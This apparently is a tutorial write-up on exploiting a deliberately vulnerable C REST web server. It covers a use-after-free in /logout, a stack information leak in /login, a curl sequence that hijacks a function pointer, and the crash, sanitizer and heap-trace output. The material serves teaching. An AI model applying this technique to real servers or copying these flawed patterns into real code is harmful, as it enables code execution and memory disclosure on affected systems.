# Heap Exploitation - Use After Free in REST API

## Intro

We will exploit a vulnerability in a REST API web server.
The actual web server is based on Mongoose HTTP server.
You can imagine that this code represents the web server of a vacuum robot.
The actual REST API is not very usefull for a web application, as it lacks
many features (checking the password, handling the session id, etc). This just
for the sake of simplicity.

We have the following REST api:
  * /login
  * /logout
  * /ping


## Files

The web server consists of three files:
* `webserver.c`: setting up callback and webserver. Doesnt interest us
* `http.c`: the main REST API
* `mongoose.c`: the Mongoose OS/Library. Doesnt interest us

The makefile is able to create the following files:
* `webserver`: Plain old web server
* `webserver.pie`: Web server in PIE
* `webserver.sanitizer`: With enabled address sanitizer (can detect heap vulnerabilities)
* `webserver.fuzzing`: With libfuzzer


## Getting Started

### REST: /login

This function will allocate a `struct t_authenticated` structure via `malloc()`.
The global variable `Authenticated` is set to point to this struct.

Also, the function will return a random session id in the HTTP response (not really
used in the app yet though).

```
// REST: /login
void rest_login(struct mg_connection *c, struct http_message *hm) {
    char response[RESPONSE_LEN];

    // Malloc and init for Authenticated struct
    Authenticated = (struct t_authenticated*) malloc(sizeof(struct t_authenticated));
    Authenticated->logout_handler = &logout_handler;
    Authenticated->role = 23;
    strcpy(Authenticated->sessionid, "5");

    // Answer
    strncpy(response, Authenticated->sessionid, 8);

    mg_send_head(c, 200, RESPONSE_LEN, "Content-Type: text/plain");
    mg_send(c, response, RESPONSE_LEN);
}
```

The relevant data structures:
```
// An authenticated user
struct t_authenticated {
    int role;
    char sessionid[128];
    void (*logout_handler)();
};

// Only supports 1 authenticated user for now
struct t_authenticated *Authenticated;
```


### REST: /logout

It will call `Authenticated->logout_handler()`, and then
`free()` the `struct t_authenticated` struct referenced in the global var `Authenticated`.

```
// REST: /logout
void rest_logout(struct mg_connection *c, struct http_message *hm) {
    char response[512];

    // Send answer
    sprintf(response, "Logout %i\r\n", Authenticated->role);
    mg_send_head(c, 200, strlen(response), "Content-Type: text/plain");
    mg_printf(c, "%s", response);

    // Cleanup
    (*Authenticated->logout_handler)();
    free(Authenticated);
}
```


### REST: /ping

This will `malloc()` a buffer of size of the query string, copy the existing query
string in it, and return it in the HTTP response.

```
// REST: /ping
void rest_ping(struct mg_connection *c, struct http_message *hm) {
    int len = (int)hm->query_string.len;

    // Answer - copy query_string and send it back
    void* qs = malloc(len);
    memcpy(qs, hm->query_string.p, hm->query_string.len);

    mg_send_head(c, 200, len, "Content-Type: text/plain");
    mg_send(c, qs, len);
}
```


## Vulnerabilities

### Use after free

`/logout` will `free()` the global variable `Authenticated`, but does not check
if it is already free'd. It can therefore free it multiple times.

### Information disclosure

`/login` will copy a few bytes into the stack variable `response`, but always send
the full length of `response` (which is `RESPONSE_LEN` = 128). The response therefore
contains a correctly 0-byte terminated string, followed by stack data.


## Vulnerability analysis

### Use after free

* `make webserver`
* `./webserver`
* `make exploit`

Where `make exploit` calls:
```
exploit:
	curl localhost:8000/login
	curl localhost:8000/logout
	curl localhost:8000/ping?aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbcccccccc
	curl localhost:8000/logout
```

The exploit does the following HTTP calls:
* `/login`: Malloc `Authenticated` (144 bytes)
* `/free`: Free `Authenticated`
* `/ping?aaa...`: Malloc the query string (~144 bytes). This will be located where `Authenticated` is pointing to
* `/free`: Free `Authanticated` again, but with the fake-chunk from step 3. Also calls `Authenticated->logout_handler()`

Result:

```
$ ./webserver
Start Webserver on port: 8000

Login
  Allocated for t_authenticated 144(0x90) at 0x55555577a930

Logout
  Authenticated:
    role          : 0x17
    sessionid     : 5
    Logout handler: 0x555555571938
  Logout event handler

Ping
  Allocating: 142 = len

Logout
  Authenticated:
    role          : 0x61616161
    sessionid     : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbcccccc
    Logout handler: 0x636363636363
Segmentation fault (core dumped)
```

Note that the output of the web server cannot be seen by the attacker. It is only
for the purpose of making writing the exploit easier (not having to use GDB so much).

Lets check if it really crashes when trying to call the address stored in
`Authenticated->logout_handler`:
```
Program received signal SIGSEGV, Segmentation fault.
0x0000636363636363 in ?? ()
```

0x63 are the letter `cccc` from the query string.


### Information disclosure

Lets check what `/login` really returns:

```
$ wget localhost:8000/login
$ hexdump -C login
00000000  4c 6f 67 69 6e 0d 0a 00  0a 00 00 00 00 00 00 00  |Login...........|
00000010  ff ff ff ff 00 00 00 00  50_d9_ff_ff_ff_7f 00 00  |........P.......|
00000020  04 00 00 00 00 00 00 00  00 bc b3 44 d1 76 c4 16  |...........D.v..|
00000030  40 cb 41 00 00 00 00 00  f2 08 00 00 04 00 00 00  |@.A.............|
00000040  e0_1d_40 00 00 00 00 00  c0_de_ff_ff_ff_7f 00 00  |..@.............|
00000050  40 cb 41 00 00 00 00 00  c1 61 40 00 00 00 00 00  |@.A......a@.....|
00000060  f8 ca 41 00 00 00 00 00  50_d4_ff_ff_ff_7f 00 00  |..A.....P.......|
00000070  b0_d2_ff_ff_ff_7f 00 00  00 00 00 00 00 00 00 00  |................|
00000080
```

GDB:
```
r12            0x401de0	4201952
r13            0x7fffffffdec0	140737488346816
```

The HTTP answer of the call to `/login` will contain the information from the
variable `response`. It contains stack pointer (indicated by `0x7fffffff????` and
addresses of code (`0x40????`))


## Exploit

* Step 1: Leak data to gain base address of stack and code
* Step 2: Perform heap-uaf to call our own function pointer into ROP


## Finding the UAF

Compile it with address sanitizer:
```
$ make webserver.sanitizer
$ ./webserver.sanitizer
```

Do login, and logout:

```
curl localhost:8000/login   # malloc
curl localhost:8000/logout  # free
curl localhost:8000/logout  # trigger UAF
```

You will see the following output:
```
$ ./webserver.sanitizer
Start

Login
  Allocated for t_authenticated 144(0x90) at 0x60d000000040

Logout
  Authenticated:
    role: 0x17
    sessionid: 1234
    Logout pointer: 0x583220
  Logout event handler

Logout
  Authenticated:
=================================================================
==7234==ERROR: AddressSanitizer: heap-use-after-free on address 0x60d000000040 at pc 0x000000584019 bp 0x7fffffffbdd0 sp 0x7fffffffbdc8
READ of size 4 at 0x60d000000040 thread T0
    #0 0x584018  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x584018)
    #1 0x5845a7  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x5845a7)
    #2 0x537fc5  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x537fc5)
    #3 0x54ff95  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x54ff95)
    #4 0x54f787  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x54f787)
    #5 0x537fc5  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x537fc5)
    #6 0x575d87  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x575d87)
    #7 0x53b586  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x53b586)
    #8 0x53b1c4  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x53b1c4)
    #9 0x544605  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x544605)
    #10 0x547789  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x547789)
    #11 0x539bb2  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x539bb2)
    #12 0x58448f  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x58448f)
    #13 0x7ffff6c1db96  (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)
    #14 0x41a719  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x41a719)

0x60d000000040 is located 0 bytes inside of 144-byte region [0x60d000000040,0x60d0000000d0)
freed by thread T0 here:
    #0 0x4da400  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x4da400)
    #1 0x58427c  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x58427c)
    #2 0x5845a7  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x5845a7)
    #3 0x537fc5  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x537fc5)
    #4 0x54ff95  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x54ff95)
    #5 0x54f787  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x54f787)
    #6 0x537fc5  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x537fc5)
    #7 0x575d87  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x575d87)
    #8 0x53b586  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x53b586)
    #9 0x53b1c4  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x53b1c4)
    #10 0x544605  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x544605)
    #11 0x547789  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x547789)
    #12 0x539bb2  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x539bb2)
    #13 0x58448f  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x58448f)
    #14 0x7ffff6c1db96  (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)

previously allocated by thread T0 here:
    #0 0x4da5d0  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x4da5d0)
    #1 0x583c03  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x583c03)
    #2 0x584572  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x584572)
    #3 0x537fc5  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x537fc5)
    #4 0x54ff95  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x54ff95)
    #5 0x54f787  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x54f787)
    #6 0x537fc5  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x537fc5)
    #7 0x575d87  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x575d87)
    #8 0x53b586  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x53b586)
    #9 0x53b1c4  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x53b1c4)
    #10 0x544605  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x544605)
    #11 0x547789  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x547789)
    #12 0x539bb2  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x539bb2)
    #13 0x58448f  (/home/dobin/Development/vulnweb/webserver.sanitizer+0x58448f)
    #14 0x7ffff6c1db96  (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)

SUMMARY: AddressSanitizer: heap-use-after-free (/home/dobin/Development/vulnweb/webserver.sanitizer+0x584018)
Shadow bytes around the buggy address:
  0x0c1a7fff7fb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c1a7fff7fc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c1a7fff7fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c1a7fff7fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c1a7fff7ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c1a7fff8000: fa fa fa fa fa fa fa fa[fd]fd fd fd fd fd fd fd
  0x0c1a7fff8010: fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa
  0x0c1a7fff8020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c1a7fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c1a7fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c1a7fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==7234==ABORTING

```


## Fuzzing


## Follow allocations

```
$ ltrace ./webserver |& ./villoc/villoc.py - out.html;

# Start
malloc(8)                                        = 0x55555577b270
calloc(1, 24)                                    = 0x55555577b290
calloc(1, 216)                                   = 0x55555577b2b0

# Login request
calloc(1, 216)                                   = 0x55555577b390
realloc(0, 1460)                                 = 0x55555577b470
realloc(0x55555577b470, 83)                      = 0x55555577b470
calloc(1, 88)                                    = 0x55555577b4d0
malloc(144)                                      = 0x55555577b530  # 144 bytes for Authenticated
realloc(0, 25)                                   = 0x55555577b5d0
realloc(0x55555577b5d0, 60)                      = 0x55555577b5d0
realloc(0x55555577b5d0, 99)                      = 0x55555577b5d0
realloc(0x55555577b5d0, 325)                     = 0x55555577b5d0
realloc(0x55555577b470, 0)                       = 0
realloc(0, 1460)                                 = 0x55555577b720
realloc(0x55555577b720, 0)                       = 0
realloc(0x55555577b5d0, 0)                       = 0
realloc(0, 1460)                                 = 0x55555577b720
realloc(0x55555577b720, 0)                       = 0
free(0x55555577b4d0)                             = <void>
free(0x55555577b390)                             = <void>

# Logout request
calloc(1, 216)                                   = 0x55555577b720
realloc(0, 1460)                                 = 0x55555577b800
realloc(0x55555577b800, 84)                      = 0x55555577b800
calloc(1, 88)                                    = 0x55555577b860
realloc(0, 25)                                   = 0x55555577b8c0
realloc(0x55555577b8c0, 60)                      = 0x55555577b8c0
realloc(0x55555577b8c0, 99)                      = 0x55555577b8c0
free(0x55555577b530)                             = <void>          # free Authenticated
realloc(0x55555577b800, 0)                       = 0
realloc(0, 1460)                                 = 0x55555577b930
realloc(0x55555577b930, 0)                       = 0
realloc(0x55555577b8c0, 0)                       = 0
realloc(0, 1460)                                 = 0x55555577b930
realloc(0x55555577b930, 0)                       = 0
free(0x55555577b860)                             = <void>
free(0x55555577b720)                             = <void>

# Ping request
calloc(1, 216)                                   = 0x55555577b930
realloc(0, 1460)                                 = 0x55555577ba10
realloc(0x55555577ba10, 227)                     = 0x55555577ba10
calloc(1, 88)                                    = 0x55555577bb00
malloc(144)                                      = 0x55555577b530 # 144 bytes, same address as Authenticated above
realloc(0, 25)                                   = 0x55555577bb60
realloc(0x55555577bb60, 60)                      = 0x55555577bb60
realloc(0x55555577bb60, 99)                      = 0x55555577bb60
realloc(0x55555577bb60, 349)                     = 0x55555577bb60
free(0x55555577b530)                             = <void>
realloc(0x55555577ba10, 0)                       = 0
realloc(0, 1460)                                 = 0x55555577bcd0
realloc(0x55555577bcd0, 0)                       = 0
realloc(0x55555577bb60, 0)                       = 0
realloc(0, 1460)                                 = 0x55555577bcd0
realloc(0x55555577bcd0, 0)                       = 0
free(0x55555577bb00)                             = <void>
free(0x55555577b930)                             = <void>
```



